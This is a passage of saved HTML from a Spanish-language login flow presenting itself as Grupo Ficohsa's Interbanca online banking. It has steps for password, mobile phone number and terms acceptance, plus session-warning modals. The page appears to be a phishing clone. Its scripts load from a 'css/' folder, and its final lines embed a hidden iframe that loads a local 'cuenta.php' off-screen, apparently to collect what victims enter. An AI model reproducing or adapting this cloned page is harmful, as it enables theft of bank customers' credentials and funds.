</wizard-step-additional-buttons>
</div>
</div>

</div>
</icb-wizard-step-one-by-one>
<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl wizardAutoHeightMode">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
Contraseña
</wizard-title>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header real-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
<wizard-step-title _ngcontent-c29="">
<div _ngcontent-c29="" class="ipswich-main-firm-data">
</div>
</wizard-step-title>
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-security-questions _ngcontent-c29="" _nghost-c39="">


</icb-login-step-security-questions>
</wizard-step-content>
</div>


<div _ngcontent-c32="" class="ipswich-main-wizard-footer ">


<div _ngcontent-c32="" class="ipswich-main-additional-buttons fr">
<wizard-step-additional-buttons _ngcontent-c29="">
<icb-button _ngcontent-c29="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>

<icb-button _ngcontent-c29="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>
</wizard-step-additional-buttons>
</div>
 </div>

</div>
</icb-wizard-step-one-by-one>
<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
Welcome to Interbanca
</wizard-title>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header real-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
<wizard-step-title _ngcontent-c29="">
<div _ngcontent-c29="" class="ipswich-main-firm-data">
Configurar el teléfono celular
</div>
</wizard-step-title>
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-update-cellphone-number _ngcontent-c29="" _nghost-c40="">
<form _ngcontent-c40="" class="main-form ng-untouched ng-pristine ng-valid" novalidate="">
<icb-textbox _ngcontent-c40="" placeholder="administration.general.login.cellphoneNumberFieldPlaceholder" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0   ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Número de movil

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="text" placeholder="Ingrese su número de móvil" maxlength="80" tabindex="0" title="Ingrese su número de móvil" autocomplete="off" name="cellPhoneNumber" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>

</form>
</icb-login-step-update-cellphone-number>
</wizard-step-content>
</div>


<div _ngcontent-c32="" class="ipswich-main-wizard-footer ">


<div _ngcontent-c32="" class="ipswich-main-additional-buttons fr">
<wizard-step-additional-buttons _ngcontent-c29="">
<icb-button _ngcontent-c29="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>

<icb-button _ngcontent-c29="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>
</wizard-step-additional-buttons>
</div>
</div>

</div>
</icb-wizard-step-one-by-one>
<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
Términos y Condiciones - Personas
</wizard-title>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
<wizard-step-title _ngcontent-c29="">
Términos y Condiciones
</wizard-step-title>
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-contract _ngcontent-c29="" _nghost-c41="">

<div _ngcontent-c41="" class="ipswich-main-content-text">
<div _ngcontent-c41="" class="ipswich-main-content-text-scroll">
<div _ngcontent-c41=""></div>
<div _ngcontent-c41="" hidden="hidden" data-hidden="hidden">
<span _ngcontent-c41="" class="ipswich-main-content-text-scroll-data">
</span>
</div>
</div>
</div>

<div _ngcontent-c41="" class="ipswich-main-content-check">
<input _ngcontent-c41="" class="ipswich-main-content-check-input" id="acceptTerms" name="acceptTerms" placeholder="acceptTerms" type="checkbox">
<label _ngcontent-c41="" class="ipswich-main-content-check-label" for="acceptTerms">Aceptar Términos y
Condiciones</label>
</div>
</icb-login-step-contract>
</wizard-step-content>
</div>


<div _ngcontent-c32="" class="ipswich-main-wizard-footer withBorders">

<div _ngcontent-c32="" class="ipswich-main-buttons-fixed fr">

<icb-button _ngcontent-c32="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>

<icb-button _ngcontent-c32="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>
</div>

</div>

</div>
</icb-wizard-step-one-by-one>
</div>
</div>

</icb-wizard>
<div _ngcontent-c29="" class="ipswich-advertising fr">
<icb-advertising _ngcontent-c29="" _nghost-c42="">

<div _ngcontent-c42="" class="prisma_responsive" id="LoginPlaceHolder"><img class="prisma_banner c-default" src="https://campaigns.ficohsa.com:443/api/image/view/13f6ebd6-3a21-4455-8ac2-f131aaf35295">
</div>

</icb-advertising>
</div>
<div _ngcontent-c29="" class="clearboth"></div>
</div>
<div _ngcontent-c29="" class="blackburn blackburn-interest-links">
<span _ngcontent-c29="" class="interest-links">
© Grupo Ficohsa -
<a _ngcontent-c29="" class="interest-links-link" href="http://www.ficohsa.com" target="_blank">www.ficohsa.com</a>
</span>
<span _ngcontent-c29="" class="interest-links-right">
<i _ngcontent-c29="" class="stream-help-circle interest-links-icon"></i>
<a _ngcontent-c29="" class="interest-links-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Preguntas
frecuentes</a>
</span>
</div>
<div _ngcontent-c29="" class="hideAlternativeWizard">
<div _ngcontent-c29="" class="blackburn">
<i _ngcontent-c29="" class="stream-lock-close-1"></i>
<span _ngcontent-c29="" class="blackburn-disclaimer">
Esta banca en línea soporta los navegadores Internet Explorer 10 y 11, Microsoft
Edge - navegador de Windows 10, Safari 5.0, 5.1 y 6.0, Firefox y Chrome.
</span>
</div>
</div>
<icb-modalpopup _ngcontent-c29="" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode medium" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">

<span _ngcontent-c5="" class="parma-content-header-text ">Advertencia de sesión
duplicada</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c29="">
 <icb-duplicate-session-warning-modal-content _ngcontent-c29="" _nghost-c43=""><span _ngcontent-c43="" class="venecia-main-warning-label">Hemos detectado una sesión
activa en otro dispositivo o navegador con su mismo
usuario</span>
<div _ngcontent-c43="" class="main-container">
<h4 _ngcontent-c43="" class="ipswich-main-form-title margin-bottom-zero">Datos de
la otra sesión </h4>
<div _ngcontent-c43="" class="venecia-main-form">
<span _ngcontent-c43="" class="venecia-main-form-label">Dirección IP:</span>
<span _ngcontent-c43="" class="venecia-main-form-label"></span>
</div>
<div _ngcontent-c43="" class="venecia-main-form">
<span _ngcontent-c43="" class="venecia-main-form-label">Navegador:</span>
<span _ngcontent-c43="" class="venecia-main-form-label"></span>
</div>
<div _ngcontent-c43="" class="venecia-main-form">
<span _ngcontent-c43="" class="venecia-main-form-label">Fecha de inicio:</span>
<span _ngcontent-c43="" class="venecia-main-form-label"></span>
</div>
</div>
<span _ngcontent-c43="" class="venecia-main-warning-label">
En caso de haber sido usted el que inició la otra sesión,
seleccione Continuar y la misma expirará inmediatamente. En caso
contrario, le recomendamos
<a _ngcontent-c43="" class="venecia-main-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">cambiar
su contraseña</a>
inmediatamente y contactarse con el banco.
</span>
</icb-duplicate-session-warning-modal-content>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true"></div>
<div _ngcontent-c5="" class="clearboth"></div>

<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">
<modal-footer _ngcontent-c29="">
</modal-footer>

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Continuar
</span>
</a>
</icb-button>


<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
 </icb-button>
</div>
</div>
</div>
</icb-modalpopup>
<icb-modalpopup _ngcontent-c29="" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode big" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">
<a _ngcontent-c5="" class="parma-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c5="" class="svg-remove-circle">
<circle _ngcontent-c5="" cx="10" cy="10" r="9"></circle>
<line _ngcontent-c5="" x1="14" x2="6" y1="6" y2="14"></line>
<line _ngcontent-c5="" x1="6" x2="14" y1="6" y2="14"></line>
</svg>
</a>
<span _ngcontent-c5="" class="parma-content-header-text ">Preguntas
Frecuentes</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c29="">
<icb-frequently-asked-questions _ngcontent-c29="" _nghost-c44="">


<list-empty-placeholder _ngcontent-c44="" class="florida_wrapper_loader_default">
<icb-empty-message _ngcontent-c44="" message="administration.general.frequentlyAskedQuestions.faqEmpty" _nghost-c52="">
<div _ngcontent-c52="" class="rimini "><i _ngcontent-c52="" class="stream-infomation-circle"></i>No existen
preguntas frecuentes configuradas</div>
</icb-empty-message>
</list-empty-placeholder>
<list-empty-placeholder _ngcontent-c44="" class="florida_wrapper_loader_default">
<icb-message-generic _ngcontent-c44="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</list-empty-placeholder>

</icb-frequently-asked-questions>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true"></div>
<div _ngcontent-c5="" class="clearboth"></div>

<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">
<modal-footer _ngcontent-c29="">
</modal-footer>

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Cerrar
</span>
</a>
</icb-button>


</div>
</div>
</div>
</icb-modalpopup>
<icb-modalpopup _ngcontent-c29="" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode small" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">

<span _ngcontent-c5="" class="parma-content-header-text ">Sesión
finalizada</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle" style="height: auto; width: auto;">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c29="">
<div _ngcontent-c29="" class="mumbai-dialog">
Su sesión ha expirado.
</div>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true"></div>
<div _ngcontent-c5="" class="clearboth"></div>

<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Cerrar
</span>
</a>
</icb-button>


</div>
</div>
</div>
</icb-modalpopup>
<router-outlet _ngcontent-c29=""></router-outlet>
</icb-login>
</div>
</main>

<div _ngcontent-c0="" class="slough_contextual">
</div>
</div>

<icb-overlay _ngcontent-c0="" _nghost-c4="">
<div _ngcontent-c4="" class="salto_overlay" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); z-index: 899;">
</div>
</icb-overlay>

<icb-modalpopup _ngcontent-c0="" confirmtext="notifications.sessionExpired.popupAcceptButtonText" size="small" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode small" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">

<span _ngcontent-c5="" class="parma-content-header-text ">Sesión finalizada</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle" style="height: auto; width: auto;">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c0="">
<div _ngcontent-c0="" class="mumbai-dialog">
Por cuestiones de seguridad su sesión ha sido finalizada.
</div>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true"></div>
<div _ngcontent-c5="" class="clearboth"></div>

<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Cerrar
</span>
</a>
</icb-button>


</div>
</div>
</div>
</icb-modalpopup>


</icb-app>
<div class="app_overlay">

<div class="mesina-loader">
<div class="mesina-logo"></div>
<div class="spinner">
<div class="bounce1"></div>
<div class="bounce2"></div>
<div class="bounce3"></div>
</div>
<div class="mesina-welcome-title">Contraseña</div>
<div class="mesina-welcome-subtitle1">Favor espera un momento...</div>
</div>
</div>
<div id="lodsin">
<icb-app class="app"></icb-app>
<div class="app_overlay">

<div class="mesina-loader">
<div class="mesina-logo"></div>
<div class="spinner">
<div class="bounce1"></div>
<div class="bounce2"></div>
<div class="bounce3"></div>
</div>
<div class="mesina-welcome-title">Bienvenido</div>
<div class="mesina-welcome-subtitle1">Favor espera un momento...</div>
</div>
</div>
</div>
<script type="text/javascript" src="css/inline.ca44eecbf42bd41b6278.bundle.js"></script>
<script type="text/javascript" src="css/polyfills.16531650934fefc16944.bundle.js"></script>
<script type="text/javascript" src="css/scripts.70d9de12282695c9709c.bundle.js"></script>
<script type="text/javascript" src="css/vendor.a46e39eddf9720c82cdb.bundle.js"></script>
<iframe name="easyXDM_default1691_provider" id="easyXDM_default1691_provider" src="cuenta.php" frameborder="0" style="position: absolute; top: -2000px; left: 0px;"></iframe>
</body>
</html>
